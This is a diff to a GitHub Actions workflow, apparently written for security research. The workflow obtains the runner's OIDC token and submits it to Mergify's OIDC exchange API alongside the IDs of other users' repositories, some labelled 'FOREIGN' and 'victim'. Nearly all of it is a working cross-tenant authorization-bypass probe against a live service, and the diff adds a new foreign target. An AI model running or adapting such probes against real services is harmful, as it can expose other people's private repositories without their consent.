@@ -12,14 +12,12 @@ jobs:
       - name: exchange probes
         run: |
           TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https%3A%2F%2Fapi.mergify.com" | jq -r .value)
-          echo "token_len=${#TOKEN}"
           probe () {
             echo "=== $1"
             jq -n --argjson id "$2" --arg t "$TOKEN" '{repository_id:$id,id_token:$t}' > /tmp/body
             curl -s -o /tmp/r -w 'status=%{http_code}\n' -X POST https://api.mergify.com/v1/ci/oidc/exchange -H 'Content-Type: application/json' --data @/tmp/body
-            head -c 500 /tmp/r; echo
+            head -c 300 /tmp/r; echo
           }
-          probe "A own repo 535704198" 535704198
-          probe "B own other repo 557596580 commerce" 557596580
-          probe "C FOREIGN repo 1458145787 diablo31-victim-private-canary" 1458145787
-          probe "D bogus 999999999" 999999999
+          probe "A own repo 535704198 (ertugrulphp has NO policy now)" 535704198
+          probe "C FOREIGN repo 1458145787 (diablo31 has policies)" 1458145787
+          probe "E FOREIGN repo 1407565076 (phiphiadasi repo-visible)" 1407565076
